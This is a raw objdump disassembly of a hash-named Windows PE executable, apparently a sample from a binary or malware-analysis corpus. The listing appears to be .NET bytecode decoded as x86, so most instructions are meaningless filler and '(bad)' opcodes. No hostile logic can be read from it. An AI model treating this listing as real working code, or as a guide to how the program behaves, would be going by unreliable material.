
4ac565360c199789ecfe2405a2093a8060e6c2a3478409be627aa7cba6f48951.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	loopne 0x401fbe
  402002:	add    BYTE PTR [eax],al
  402004:	add    BYTE PTR [eax],al
  402006:	add    BYTE PTR [eax],al
  402008:	dec    eax
  402009:	add    BYTE PTR [eax],al
  40200b:	add    BYTE PTR [edx],al
  40200d:	add    BYTE PTR ds:0x599400,al
  402013:	add    BYTE PTR [eax+0xb000062],ch
  402019:	add    BYTE PTR [eax],al
  40201b:	add    BYTE PTR [eax+eax*1],cl
  40201e:	add    BYTE PTR [esi],al
  402020:	push   eax
  402021:	add    BYTE PTR ds:[eax],al
  402024:	inc    ecx
  402025:	sbb    eax,DWORD PTR [eax]
  402027:	add    BYTE PTR [eax+0x20],dl
  40202a:	add    BYTE PTR [eax],al
  40202c:	add    BYTE PTR [eax],0x0
	...
  40204f:	add    BYTE PTR [ebx+0x7b],al
  402052:	stc    
  402053:	jnp    0x40207a
  402055:	fdiv   QWORD PTR [esi+0x19]
  402058:	sbb    BYTE PTR [ebx-0x80],al
  40205b:	in     eax,0xe2
  40205d:	dec    ebx
  40205e:	adc    dh,BYTE PTR [edi]
  402060:	xchg   esi,eax
  402061:	mov    ah,al
  402063:	neg    DWORD PTR [ebp+0x6a14ced]
  402069:	mov    al,0x9b
  40206b:	fs into 
  40206d:	loop   0x402086
  40206f:	mov    esp,esp
  402071:	pop    esp
  402072:	mov    cl,0x85
  402074:	jg     0x402082
  402076:	xlat   BYTE PTR ds:[ebx]
  402077:	add    al,0x5c
  402079:	rcr    BYTE PTR [esi+0x7c],cl
  40207c:	in     eax,0x30
  40207e:	fidivr WORD PTR [edi+0x5f]
  402081:	jb     0x402030
  402083:	cld    
  402084:	fdivrp st(5),st
  402086:	stc    
  402087:	and    DWORD PTR [ebx-0x41],ecx
  40208a:	xchg   DWORD PTR [ebp-0x3b],edi
  40208d:	jne    0x402063
  40208f:	aaa    
  402090:	mov    si,0xd478
  402094:	and    DWORD PTR [esp+edx*2+0x35],edi
  402098:	scas   eax,DWORD PTR es:[edi]
  402099:	or     al,0x68
  40209b:	lea    ecx,[edx]
  40209d:	(bad)  
  40209e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40209f:	es gs clc 
  4020a2:	call   0x36d8da6c
  4020a7:	adc    BYTE PTR [ebp+0x56],cl
  4020aa:	(bad)  
  4020ab:	xchg   edi,eax
  4020ac:	lahf   
  4020ad:	pop    edi
  4020ae:	sti    
  4020af:	push   esp
  4020b0:	idiv   ebx
  4020b2:	xchg   esp,ebp
  4020b4:	(bad)  [esi-0x51d3a9b]
  4020ba:	enter  0xf1f1,0x37
  4020be:	mov    esp,gs
  4020c0:	sahf   
  4020c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020c2:	(bad)  [ecx]
  4020c4:	rcr    DWORD PTR [esi-0x7661ec7e],0x68
  4020cb:	inc    ebp
  4020cc:	sbb    DWORD PTR [esi-0x6c],eax
  4020cf:	imul   ebx,DWORD PTR [edx+0x3e7e],0x721e2d04
  4020d9:	add    DWORD PTR [eax],eax
  4020db:	add    BYTE PTR [eax-0x30],dh
  4020de:	or     BYTE PTR [eax],al
  4020e0:	add    BYTE PTR [edx],al
  4020e2:	sub    BYTE PTR [eax+eax*1],dl
  4020e5:	add    BYTE PTR [edx],cl
  4020e7:	sub    BYTE PTR ds:0x730a0000,dl
  4020ed:	push   ss
  4020ee:	add    BYTE PTR [eax],al
  4020f0:	or     al,BYTE PTR [eax+0x400003e]
  4020f6:	sub    al,BYTE PTR [eax]
  4020f8:	adc    esi,DWORD PTR [eax]
  4020fa:	add    eax,DWORD PTR [eax]
  4020fc:	and    al,BYTE PTR [eax]
  4020fe:	add    BYTE PTR [eax],al
  402100:	add    DWORD PTR [eax],eax
  402102:	add    BYTE PTR [ecx],dl
  402104:	add    ch,BYTE PTR [eax]
  402106:	add    eax,DWORD PTR [eax]
  402108:	add    BYTE PTR [esi],al
  40210a:	or     al,BYTE PTR [esi]
  40210c:	sub    eax,0xf7216
  402111:	add    BYTE PTR [eax+0x2],dh
  402114:	jb     0x40215f
  402116:	add    BYTE PTR [eax],al
  402118:	jo     0x402142
  40211a:	pop    ss
  40211b:	add    BYTE PTR [eax],al
  40211d:	or     dh,BYTE PTR [ebx+0x18]
  402120:	add    BYTE PTR [eax],al
  402122:	or     bh,BYTE PTR [edx+0x6]
  402125:	sub    al,BYTE PTR [eax]
  402127:	add    BYTE PTR [ebx],dl
  402129:	xor    BYTE PTR [ebx],al
  40212b:	add    BYTE PTR [eax+eax*1],dl
  40212e:	add    BYTE PTR [eax],al
  402130:	add    DWORD PTR [eax],eax
  402132:	add    BYTE PTR [ecx],dl
  402134:	sub    BYTE PTR [ecx],al
  402136:	add    BYTE PTR [eax],al
  402138:	push   es
  402139:	jle    0x402179
  40213b:	add    BYTE PTR [eax],al
  40213d:	add    al,0x2
  40213f:	adc    al,0x6f
  402141:	sbb    DWORD PTR [eax],eax
  402143:	add    BYTE PTR [edx],cl
  402145:	or     al,BYTE PTR [esi]
  402147:	sub    bl,BYTE PTR [esi]
  402149:	add    ch,BYTE PTR [eax]
  40214b:	add    al,BYTE PTR [eax]
  40214d:	add    BYTE PTR [esi],al
  40214f:	sub    dh,BYTE PTR [esi]
  402151:	add    ch,BYTE PTR [eax]
  402153:	add    al,BYTE PTR [eax]
  402155:	add    BYTE PTR [esi],al
  402157:	add    ebp,DWORD PTR [eax]
  402159:	sbb    al,BYTE PTR [eax]
  40215b:	add    BYTE PTR [edx],cl
  40215d:	sub    bh,BYTE PTR [edx]
  40215f:	add    ch,BYTE PTR [eax]
  402161:	add    al,BYTE PTR [eax]
  402163:	add    BYTE PTR [esi],al
  402165:	add    eax,DWORD PTR [eax+ebp*1]
  402168:	sbb    eax,DWORD PTR [eax]
  40216a:	add    BYTE PTR [edx],cl
  40216c:	sub    bh,BYTE PTR [esi]
  40216e:	add    ch,BYTE PTR [eax]
  402170:	add    al,BYTE PTR [eax]
  402172:	add    BYTE PTR [esi],al
  402174:	add    eax,DWORD PTR [eax*1+0x1c28]
  40217b:	or     ch,BYTE PTR [edx]
  40217d:	add    BYTE PTR [eax],al
  40217f:	add    BYTE PTR [ebx],dl
  402181:	xor    BYTE PTR [eax+eax*1],al
  402184:	and    eax,0x2000000
  402189:	add    BYTE PTR [eax],al
  40218b:	adc    DWORD PTR [edx],eax
  40218d:	sub    BYTE PTR [edx],al
  40218f:	add    BYTE PTR [eax],al
  402191:	push   es
  402192:	sbb    cl,BYTE PTR [ebp+0x1000001]
  402198:	or     al,BYTE PTR [esi]
  40219a:	push   ss
  40219b:	add    esp,DWORD PTR [edx-0x5dfbe8fa]
  4021a1:	push   es
  4021a2:	sbb    BYTE PTR ds:0xe1906a2,al
  4021a8:	add    al,0xa2
  4021aa:	push   es
  4021ab:	sub    BYTE PTR ds:0x2a0a0000,bl
  4021b1:	add    BYTE PTR [eax],al
  4021b3:	add    BYTE PTR [ebx],dl
  4021b5:	xor    BYTE PTR [eax+eax*1],al
  4021b8:	sub    al,BYTE PTR [eax]
  4021ba:	add    BYTE PTR [eax],al
  4021bc:	add    al,BYTE PTR [eax]
  4021be:	add    BYTE PTR [ecx],dl
  4021c0:	add    ch,BYTE PTR [eax]
  4021c2:	add    al,BYTE PTR [eax]
  4021c4:	add    BYTE PTR [esi],al
  4021c6:	sbb    ecx,DWORD PTR [ebp+0x1000001]
  4021cc:	or     al,BYTE PTR [esi]
  4021ce:	push   ss
  4021cf:	add    esp,DWORD PTR [edx-0x5dfbe8fa]
  4021d5:	push   es
  4021d6:	sbb    BYTE PTR ds:0xe1906a2,al
  4021dc:	add    al,0xa2
  4021de:	push   es
  4021df:	sbb    cl,BYTE PTR [esi]
  4021e1:	add    eax,0x1d2806a2
  4021e6:	add    BYTE PTR [eax],al
  4021e8:	or     ch,BYTE PTR [edx]
  4021ea:	add    BYTE PTR [eax],al
  4021ec:	adc    esi,DWORD PTR [eax]
  4021ee:	add    al,0x0
  4021f0:	das    
  4021f1:	add    BYTE PTR [eax],al
  4021f3:	add    BYTE PTR [edx],al
  4021f5:	add    BYTE PTR [eax],al
  4021f7:	adc    DWORD PTR [edx],eax
  4021f9:	sub    BYTE PTR [edx],al
  4021fb:	add    BYTE PTR [eax],al
  4021fd:	push   es
  4021fe:	sbb    al,0x8d
  402200:	add    DWORD PTR [eax],eax
  402202:	add    BYTE PTR [ecx],al
  402204:	or     al,BYTE PTR [esi]
  402206:	push   ss
  402207:	add    esp,DWORD PTR [edx-0x5dfbe8fa]
  40220d:	push   es
  40220e:	sbb    BYTE PTR ds:0xe1906a2,al
  402214:	add    al,0xa2
  402216:	push   es
  402217:	sbb    cl,BYTE PTR [esi]
  402219:	add    eax,0xe1b06a2
  40221e:	push   es
  40221f:	mov    ds:0x1d2806,al
  402224:	add    BYTE PTR [edx],cl
  402226:	sub    bl,BYTE PTR [esi]
  402228:	add    ch,BYTE PTR [eax]
  40222a:	push   ds
  40222b:	add    BYTE PTR [eax],al
  40222d:	or     ch,BYTE PTR [edx]
  40222f:	add    BYTE PTR [ebx],dl
  402231:	xor    BYTE PTR [ebx],al
  402233:	add    BYTE PTR [edi],ch
  402235:	add    BYTE PTR [eax],al
  402237:	add    BYTE PTR [ebx],al
  402239:	add    BYTE PTR [eax],al
  40223b:	adc    DWORD PTR [esi],edx
  40223d:	or     ch,BYTE PTR [eax]
  40223f:	push   cs
  402240:	add    BYTE PTR [eax],al
  402242:	push   es
  402243:	add    bh,BYTE PTR [edi+0x42]
  402246:	add    BYTE PTR [eax],al
  402248:	add    al,0x12
  40224a:	add    BYTE PTR [eax],ch
  40224c:	adc    DWORD PTR [eax],eax
  40224e:	add    BYTE PTR [esi],al
  402250:	sub    eax,0x7e2a0602
  402255:	inc    edx
  402256:	add    BYTE PTR [eax],al
  402258:	add    al,0x7b
  40225a:	add    BYTE PTR [bx+si],al
  40225d:	add    al,0x2d
  40225f:	add    eax,0x1228
  402264:	push   es
  402265:	sub    BYTE PTR ds:0x2a060000,cl
  40226b:	add    BYTE PTR [ebx],bl
  40226d:	xor    BYTE PTR [eax+eax*1],cl
  402270:	cli    
  402271:	add    al,BYTE PTR [eax]
  402273:	add    BYTE PTR [eax+eax*1],al
  402276:	add    BYTE PTR [ecx],dl
  402278:	adc    al,0xa
  40227a:	adc    al,0xb
  40227c:	push   ss
  40227d:	or     al,0x7e
  40227f:	inc    edx
  402280:	add    BYTE PTR [eax],al
  402282:	add    al,0x7e
  402284:	inc    edx
  402285:	add    BYTE PTR [eax],al
  402287:	add    al,0x7b
  402289:	pop    edi
  40228a:	add    BYTE PTR [eax],al
  40228c:	add    al,0x28
  40228e:	sldt   WORD PTR [eax]
  402291:	push   es
  402292:	jge    0x4022f3
  402294:	add    BYTE PTR [eax],al
  402296:	add    al,0x7e
  402298:	inc    edx
  402299:	add    BYTE PTR [eax],al
  40229b:	add    al,0x7b
  40229d:	pusha  
  40229e:	add    BYTE PTR [eax],al
  4022a0:	add    al,0x2c
  4022a2:	push   ds
  4022a3:	jle    0x4022e7
  4022a5:	add    BYTE PTR [eax],al
  4022a7:	add    al,0x7e
  4022a9:	inc    edx
  4022aa:	add    BYTE PTR [eax],al
  4022ac:	add    al,0x7b
  4022ae:	pusha  
  4022af:	add    BYTE PTR [eax],al
  4022b1:	add    al,0x73
  4022b3:	pop    ds
  4022b4:	add    BYTE PTR [eax],al
  4022b6:	or     ch,BYTE PTR [edi+0x20]
  4022b9:	add    BYTE PTR [eax],al
  4022bb:	or     bh,BYTE PTR [ebp+0x60]
  4022be:	add    BYTE PTR [eax],al
  4022c0:	add    al,0x7e
  4022c2:	inc    edx
  4022c3:	add    BYTE PTR [eax],al
  4022c5:	add    al,0x7b
  4022c7:	bound  eax,QWORD PTR [eax]
  4022c9:	add    BYTE PTR [esp+ebp*1],al
  4022cc:	sbb    DWORD PTR [esi+0x42],edi
  4022cf:	add    BYTE PTR [eax],al
  4022d1:	add    al,0x7e
  4022d3:	inc    edx
  4022d4:	add    BYTE PTR [eax],al
  4022d6:	add    al,0x7b
  4022d8:	bound  eax,QWORD PTR [eax]
  4022da:	add    BYTE PTR [eax+ebp*1],al
  4022dd:	sldt   WORD PTR [eax]
  4022e0:	push   es
  4022e1:	jge    0x402345
  4022e3:	add    BYTE PTR [eax],al
  4022e5:	add    al,0x16
  4022e7:	or     eax,0x427e262b
  4022ec:	add    BYTE PTR [eax],al
  4022ee:	add    al,0x7b
  4022f0:	arpl   WORD PTR [eax],ax
  4022f2:	add    BYTE PTR [ecx+ecx*1],al
  4022f5:	jle    0x402339
  4022f7:	add    BYTE PTR [eax],al
  4022f9:	add    al,0x7b
  4022fb:	arpl   WORD PTR [eax],ax
  4022fd:	add    BYTE PTR [ecx+ecx*1],al
  402300:	call   0x6f0a:0x1f73
  402307:	and    BYTE PTR [eax],al
  402309:	add    BYTE PTR [edx],cl
  40230b:	mov    ds:0xd581709,al
  402310:	or     DWORD PTR [esi+0x42],edi
  402313:	add    BYTE PTR [eax],al
  402315:	add    al,0x7b
  402317:	arpl   WORD PTR [eax],ax
  402319:	add    BYTE PTR [esi+ecx*4],al
  40231c:	imul   esi,DWORD PTR [edx],0x41316cb
  402322:	sub    ebp,DWORD PTR [edx]
  402324:	jle    0x402368
  402326:	add    BYTE PTR [eax],al
  402328:	add    al,0x7b
  40232a:	add    BYTE PTR fs:[eax],al
  40232d:	add    al,0x11
  40232f:	add    al,0x7e
  402331:	inc    edx
  402332:	add    BYTE PTR [eax],al
  402334:	add    al,0x7b
  402336:	add    BYTE PTR fs:[eax],al
  402339:	add    al,0x11
  40233b:	add    al,0x9a
  40233d:	jae    0x40235e
  40233f:	add    BYTE PTR [eax],al
  402341:	or     ch,BYTE PTR [edi+0x20]
  402344:	add    BYTE PTR [eax],al
  402346:	or     ah,BYTE PTR [edx+0x58170411]
  40234c:	adc    eax,DWORD PTR [ecx+edx*1]
  40234f:	add    al,0x7e
  402351:	inc    edx
  402352:	add    BYTE PTR [eax],al
  402354:	add    al,0x7b
  402356:	add    BYTE PTR fs:[eax],al
  402359:	add    al,0x8e
  40235b:	imul   esi,DWORD PTR [edx],0x427ec6
  402361:	add    BYTE PTR [ebx+edi*2],al
  402364:	pusha  
  402365:	add    BYTE PTR [eax],al
  402367:	add    al,0x2c
  402369:	pop    esp
  40236a:	jle    0x4023ae
  40236c:	add    BYTE PTR [eax],al
  40236e:	add    al,0x7b
  402370:	pop    edi
  402371:	add    BYTE PTR [eax],al
  402373:	add    al,0x7e
  402375:	inc    edx
  402376:	add    BYTE PTR [eax],al
  402378:	add    al,0x7b
  40237a:	pusha  
  40237b:	add    BYTE PTR [eax],al
  40237d:	add    al,0x17
  40237f:	sub    BYTE PTR [ecx],ah
  402381:	add    BYTE PTR [eax],al
  402383:	or     ch,BYTE PTR [eax]
  402385:	and    al,BYTE PTR [eax]
  402387:	add    BYTE PTR [edx],cl
  402389:	sub    eax,0x5d7210
  40238e:	add    BYTE PTR [eax+0x28],dh
  402391:	add    al,0x0
  402393:	add    BYTE PTR [esi],al
  402395:	jae    0x4023af
  402397:	add    BYTE PTR [eax],al
  402399:	or     bh,BYTE PTR [edx+0x7e]
  40239c:	inc    edx
  40239d:	add    BYTE PTR [eax],al
  40239f:	add    al,0x7b
  4023a1:	pusha  
  4023a2:	add    BYTE PTR [eax],al
  4023a4:	add    al,0x28
  4023a6:	and    eax,DWORD PTR [eax]
  4023a8:	add    BYTE PTR [edx],cl
  4023aa:	sub    BYTE PTR [eax+eax*1],ah
  4023ad:	add    BYTE PTR [edx],cl
  4023af:	sub    eax,0x427e15
  4023b4:	add    BYTE PTR [ebx+edi*2],al
  4023b7:	pusha  
  4023b8:	add    BYTE PTR [eax],al
  4023ba:	add    al,0x28
  4023bc:	and    eax,DWORD PTR [eax]
  4023be:	add    BYTE PTR [edx],cl
  4023c0:	sub    BYTE PTR ds:0x260a0000,ah
  4023c6:	jle    0x40240a
  4023c8:	add    BYTE PTR [eax],al
  4023ca:	add    al,0x7b
  4023cc:	pop    edi
  4023cd:	add    BYTE PTR [eax],al
  4023cf:	add    al,0x28
  4023d1:	and    eax,DWORD PTR [eax]
  4023d3:	add    BYTE PTR [edx],cl
  4023d5:	or     ch,BYTE PTR [eax]
  4023d7:	add    BYTE PTR es:[eax],al
  4023da:	or     cl,BYTE PTR [ebx]
  4023dc:	push   es
  4023dd:	sub    al,0x1d
  4023df:	push   es
  4023e0:	outs   dx,DWORD PTR ds:[esi]
  4023e1:	daa    
  4023e2:	add    BYTE PTR [eax],al
  4023e4:	or     ch,BYTE PTR [edx*1+0x28170607]
  4023eb:	and    DWORD PTR [eax],eax
  4023ed:	add    BYTE PTR [edx],cl
  4023ef:	sub    BYTE PTR [edx],ah
  4023f1:	add    BYTE PTR [eax],al
  4023f3:	or     ch,BYTE PTR [esi+eax*1]
  4023f6:	push   es
  4023f7:	sub    BYTE PTR [eax],ch
  4023f9:	add    BYTE PTR [eax],al
  4023fb:	or     bh,BYTE PTR [esi+0x42]
  4023fe:	add    BYTE PTR [eax],al
  402400:	add    al,0x7b
  402402:	pusha  
  402403:	add    BYTE PTR [eax],al
  402405:	add    al,0x2c
  402407:	sub    al,0x7e
  402409:	inc    edx
  40240a:	add    BYTE PTR [eax],al
  40240c:	add    al,0x7b
  40240e:	pusha  
  40240f:	add    BYTE PTR [eax],al
  402411:	add    al,0x28
  402413:	and    eax,DWORD PTR [eax]
  402415:	add    BYTE PTR [edx],cl
  402417:	sub    al,0x1b
  402419:	jle    0x40245d
  40241b:	add    BYTE PTR [eax],al
  40241d:	add    al,0x7e
  40241f:	inc    edx
  402420:	add    BYTE PTR [eax],al
  402422:	add    al,0x7b
  402424:	pusha  
  402425:	add    BYTE PTR [eax],al
  402427:	add    al,0x28
  402429:	and    eax,DWORD PTR [eax]
  40242b:	add    BYTE PTR [edx],cl
  40242d:	jge    0x402490
  40242f:	add    BYTE PTR [eax],al
  402431:	add    al,0x2b
  402433:	or     edi,DWORD PTR [esi+0x42]
  402436:	add    BYTE PTR [eax],al
  402438:	add    al,0x7
  40243a:	jge    0x40249d
  40243c:	add    BYTE PTR [eax],al
  40243e:	add    al,0x73
  402440:	sub    DWORD PTR [eax],eax
  402442:	add    BYTE PTR [edx],cl
  402444:	adc    eax,DWORD PTR ds:0x6f060511
  40244a:	sub    al,BYTE PTR [eax]
  40244c:	add    BYTE PTR [edx],cl
  40244e:	jb     0x402451
  402450:	add    BYTE PTR [eax],al
  402452:	jo     0x402468
  402454:	adc    DWORD PTR ds:0x2b28,eax
  40245a:	or     dl,BYTE PTR [ebx]
  40245c:	push   es
  40245d:	adc    DWORD PTR [esi],eax
  40245f:	sub    eax,0x997210
  402464:	add    BYTE PTR [eax+0x28],dh
  402467:	add    al,0x0
  402469:	add    BYTE PTR [esi],al
  40246b:	jae    0x402485
  40246d:	add    BYTE PTR [eax],al
  40246f:	or     bh,BYTE PTR [edx-0x30]
  402472:	or     al,0x0
  402474:	add    BYTE PTR [edx],al
  402476:	sub    BYTE PTR [eax+eax*1],dl
  402479:	add    BYTE PTR [edx],cl
  40247b:	outs   dx,DWORD PTR ds:[esi]
  40247c:	sub    al,0x0
  40247e:	add    BYTE PTR [edx],cl
  402480:	outs   dx,DWORD PTR ds:[esi]
  402481:	sub    eax,0x130a0000
  402486:	pop    es
  402487:	adc    DWORD PTR [esi],eax
  402489:	adc    DWORD PTR [edi],eax
  40248b:	outs   dx,DWORD PTR ds:[esi]
  40248c:	add    BYTE PTR cs:[eax],al
  40248f:	or     dh,BYTE PTR [edx-0x33]
  402492:	add    BYTE PTR [eax],al
  402494:	jo     0x402505
  402496:	das    
  402497:	add    BYTE PTR [eax],al
  402499:	or     dl,BYTE PTR [ebx]
  40249b:	or     BYTE PTR [ecx],dl
  40249d:	or     BYTE PTR ds:0xfd7210,ch
  4024a3:	add    BYTE PTR [eax+0x28],dh
  4024a6:	add    al,0x0
  4024a8:	add    BYTE PTR [esi],al
  4024aa:	jae    0x4024c4
  4024ac:	add    BYTE PTR [eax],al
  4024ae:	or     bh,BYTE PTR [edx+0x11]
  4024b1:	or     BYTE PTR [edi+0x30],ch
  4024b4:	add    BYTE PTR [eax],al
  4024b6:	or     dh,BYTE PTR [esp+ecx*1+0x0]
  4024ba:	add    BYTE PTR [edx],al
  4024bc:	adc    ecx,DWORD PTR [ecx]
  4024be:	adc    DWORD PTR [ecx],ecx
  4024c0:	sub    al,0x76
  4024c2:	adc    DWORD PTR [ecx],ecx
  4024c4:	jle    0x402508
  4024c6:	add    BYTE PTR [eax],al
  4024c8:	add    al,0x7b
  4024ca:	pop    edi
  4024cb:	add    BYTE PTR [eax],al
  4024cd:	add    al,0x7e
  4024cf:	inc    edx
  4024d0:	add    BYTE PTR [eax],al
  4024d2:	add    al,0x7b
  4024d4:	pusha  
  4024d5:	add    BYTE PTR [eax],al
  4024d7:	add    al,0x7e
  4024d9:	inc    edx
  4024da:	add    BYTE PTR [eax],al
  4024dc:	add    al,0x7b
  4024de:	popa   
  4024df:	add    BYTE PTR [eax],al
  4024e1:	add    al,0x7e
  4024e3:	inc    edx
  4024e4:	add    BYTE PTR [eax],al
  4024e6:	add    al,0x7b
  4024e8:	bound  eax,QWORD PTR [eax]
  4024ea:	add    BYTE PTR [esi+edi*2],al
  4024ed:	inc    edx
  4024ee:	add    BYTE PTR [eax],al
  4024f0:	add    al,0x7b
  4024f2:	arpl   WORD PTR [eax],ax
  4024f4:	add    BYTE PTR [esi+edi*2],al
  4024f7:	inc    edx
  4024f8:	add    BYTE PTR [eax],al
  4024fa:	add    al,0x7b
  4024fc:	add    BYTE PTR fs:[eax],al
  4024ff:	add    al,0x7e
  402501:	inc    edx
  402502:	add    BYTE PTR [eax],al
  402504:	add    al,0x7b
  402506:	add    BYTE PTR gs:[eax],al
  402509:	add    al,0x7e
  40250b:	inc    edx
  40250c:	add    BYTE PTR [eax],al
  40250e:	add    al,0x7b
  402510:	data16 add BYTE PTR [eax],al
  402513:	add    al,0x7e
  402515:	inc    edx
  402516:	add    BYTE PTR [eax],al
  402518:	add    al,0x7b
  40251a:	add    BYTE PTR [bx+si],al
  40251d:	add    al,0x7e
  40251f:	inc    edx
  402520:	add    BYTE PTR [eax],al
  402522:	add    al,0x7b
  402524:	push   0x7e040000
  402529:	inc    edx
  40252a:	add    BYTE PTR [eax],al
  40252c:	add    al,0x7b
  40252e:	imul   eax,DWORD PTR [eax],0x226f0400
  402534:	add    BYTE PTR [eax],al
  402536:	push   es
  402537:	or     al,0x11
  402539:	push   es
  40253a:	sub    BYTE PTR [ecx],dh
  40253c:	add    BYTE PTR [eax],al
  40253e:	or     bl,dh
  402540:	das    
  402541:	adc    ecx,DWORD PTR [edx]
  402543:	adc    DWORD PTR [edx],ecx
  402545:	outs   dx,DWORD PTR ds:[esi]
  402546:	xor    al,BYTE PTR [eax]
  402548:	add    BYTE PTR [edx],cl
  40254a:	sub    al,0xe
  40254c:	adc    DWORD PTR [edx],ecx
  40254e:	outs   dx,DWORD PTR ds:[esi]
  40254f:	xor    al,BYTE PTR [eax]
  402551:	add    BYTE PTR [edx],cl
  402553:	sub    BYTE PTR [ebp+0x0],dl
  402556:	add    BYTE PTR [esi],al
  402558:	sub    edx,DWORD PTR [ecx]
  40255a:	adc    DWORD PTR [edx],ecx
  40255c:	outs   dx,DWORD PTR ds:[esi]
  40255d:	xor    eax,DWORD PTR [eax]
  40255f:	add    BYTE PTR [edx],cl
  402561:	outs   dx,DWORD PTR ds:[esi]
  402562:	xor    al,0x0
  402564:	add    BYTE PTR [edx],cl
  402566:	sub    BYTE PTR [ebp+0x0],dl
  402569:	add    BYTE PTR [esi],al
  40256b:	pop    ds
  40256c:	fs or  al,0xde
  40256f:	add    BYTE PTR [eax],cl
  402571:	sub    al,BYTE PTR [eax]
  402573:	add    BYTE PTR [ecx+0x1c],al
  402576:	add    BYTE PTR [eax],al
  402578:	add    BYTE PTR [eax],al
  40257a:	add    BYTE PTR [eax],al
  40257c:	push   es
  40257d:	add    BYTE PTR [eax],al
  40257f:	add    bl,al
  402581:	add    al,BYTE PTR [eax]
  402583:	add    cl,cl
  402585:	add    al,BYTE PTR [eax]
  402587:	add    BYTE PTR [edi],ch
  402589:	add    BYTE PTR [eax],al
  40258b:	add    BYTE PTR [eax+eax*1],cl
  40258e:	add    BYTE PTR [ecx],al
  402590:	adc    esi,DWORD PTR [eax]
  402592:	add    eax,DWORD PTR [eax]
  402594:	ins    BYTE PTR es:[edi],dx
  402595:	add    BYTE PTR [eax],al
  402597:	add    BYTE PTR ds:0x28110000,al
  40259d:	xor    eax,0xa0a0000
  4025a2:	push   es
  4025a3:	sub    BYTE PTR [esi],dh
  4025a5:	add    BYTE PTR [eax],al
  4025a7:	or     ch,BYTE PTR [edi+0x37]
  4025aa:	add    BYTE PTR [eax],al
  4025ac:	or     ch,BYTE PTR [edi+0x38]
  4025af:	add    BYTE PTR [eax],al
  4025b1:	or     ch,BYTE PTR [eax]
  4025b3:	cmp    DWORD PTR [eax],eax
  4025b5:	add    BYTE PTR [edx],cl
  4025b7:	outs   dx,DWORD PTR ds:[esi]
  4025b8:	cmp    al,BYTE PTR [eax]
  4025ba:	add    BYTE PTR [edx],cl
  4025bc:	pop    ss
  4025bd:	cs dec eax
  4025bf:	sub    BYTE PTR [ebx],bh
  4025c1:	add    BYTE PTR [eax],al
  4025c3:	or     ch,BYTE PTR [edi+0x3c]
  4025c6:	add    BYTE PTR [eax],al
  4025c8:	or     al,BYTE PTR [esi]
  4025ca:	outs   dx,DWORD PTR ds:[esi]
  4025cb:	cmp    eax,0x6f0a0000
  4025d0:	add    BYTE PTR ds:[eax],al
  4025d3:	or     ch,BYTE PTR [edi+0x3f]
  4025d6:	add    BYTE PTR [eax],al
  4025d8:	or     ch,BYTE PTR [esi]
  4025da:	sub    al,0x28
  4025dc:	cmp    eax,DWORD PTR [eax]
  4025de:	add    BYTE PTR [edx],cl
  4025e0:	outs   dx,DWORD PTR ds:[esi]
  4025e1:	cmp    al,0x0
  4025e3:	add    BYTE PTR [edx],cl
  4025e5:	push   es
  4025e6:	outs   dx,DWORD PTR ds:[esi]
  4025e7:	cmp    eax,0x6f0a0000
  4025ec:	add    BYTE PTR ds:[eax],al
  4025ef:	or     ch,BYTE PTR [edi+0x40]
  4025f2:	add    BYTE PTR [eax],al
  4025f4:	or     ch,BYTE PTR [esi]
  4025f6:	adc    BYTE PTR [esi],al
  4025f8:	jb     0x402631
  4025fa:	add    DWORD PTR [eax],eax
  4025fc:	jo     0x402671
  4025fe:	inc    ecx
  4025ff:	add    BYTE PTR [eax],al
  402601:	or     ch,BYTE PTR [edi+0x38]
  402604:	add    BYTE PTR [eax],al
  402606:	or     ch,BYTE PTR [edx]
  402608:	adc    esi,DWORD PTR [eax]
  40260a:	push   es
  40260b:	add    BYTE PTR [esi+0x0],bh
  40260e:	add    BYTE PTR [eax],al
  402610:	push   es
  402611:	add    BYTE PTR [eax],al
  402613:	adc    DWORD PTR [edx+ecx*1],edx
  402616:	add    ch,BYTE PTR [eax]
  402618:	inc    edx
  402619:	add    BYTE PTR [eax],al
  40261b:	or     dh,BYTE PTR [ebx+0x1f]
  40261e:	add    BYTE PTR [eax],al
  402620:	or     ch,BYTE PTR [edi+0x20]
  402623:	add    BYTE PTR [eax],al
  402625:	or     cl,BYTE PTR [edx]
  402627:	push   es
  402628:	sub    BYTE PTR [ebx+0x0],al
  40262b:	add    BYTE PTR [edx],cl
  40262d:	sub    eax,0x1052041
  402632:	add    BYTE PTR [eax],al
  402634:	jae    0x40267a
  402636:	add    BYTE PTR [eax],al
  402638:	or     cl,BYTE PTR [ebx]
  40263a:	adc    al,0x2
  40263c:	adc    al,0x7
  40263e:	outs   dx,DWORD PTR ds:[esi]
  40263f:	inc    ebp
  402640:	add    BYTE PTR [eax],al
  402642:	or     dl,BYTE PTR [edi]
  402644:	pop    eax
  402645:	pop    es
  402646:	adc    al,0x28
  402648:	adc    al,0x0
  40264a:	add    BYTE PTR [esi],al
  40264c:	sub    eax,0x1437211
  402651:	add    BYTE PTR [eax+0x2],dh
  402654:	sub    BYTE PTR ds:0x73060000,al
  40265a:	sbb    BYTE PTR [eax],al
  40265c:	add    BYTE PTR [edx],cl
  40265e:	jp     0x402667
  402660:	outs   dx,DWORD PTR ds:[esi]
  402661:	xor    al,0x0
  402663:	add    BYTE PTR [edx],cl
  402665:	jae    0x402686
  402667:	add    BYTE PTR [eax],al
  402669:	or     ch,BYTE PTR [edi+0x20]
  40266c:	add    BYTE PTR [eax],al
  40266e:	or     cl,BYTE PTR [edx]
  402670:	push   es
  402671:	sub    al,0x1d
  402673:	jle    0x4026b7
  402675:	add    BYTE PTR [eax],al
  402677:	add    al,0x7b
  402679:	push   0x2c040000
  40267e:	adc    DWORD PTR [edx+0x6f],esi
  402681:	add    DWORD PTR [eax],eax
  402683:	jo     0x402687
  402685:	push   es
  402686:	sub    BYTE PTR [esi],al
  402688:	add    BYTE PTR [eax],al
  40268a:	push   es
  40268b:	sub    BYTE PTR [eax+0x0],ah
  40268e:	add    BYTE PTR [esi],al
  402690:	push   es
  402691:	sub    al,BYTE PTR [eax]
  402693:	add    BYTE PTR [ebx],dl
  402695:	xor    BYTE PTR [ecx],al
  402697:	add    BYTE PTR [ebx],dl
  402699:	add    BYTE PTR [eax],al
  40269b:	add    BYTE PTR [ecx],al
  40269d:	add    BYTE PTR [eax],al
  40269f:	adc    DWORD PTR [edx],eax
  4026a1:	sub    BYTE PTR [edx+0x0],al
  4026a4:	add    BYTE PTR [edx],cl
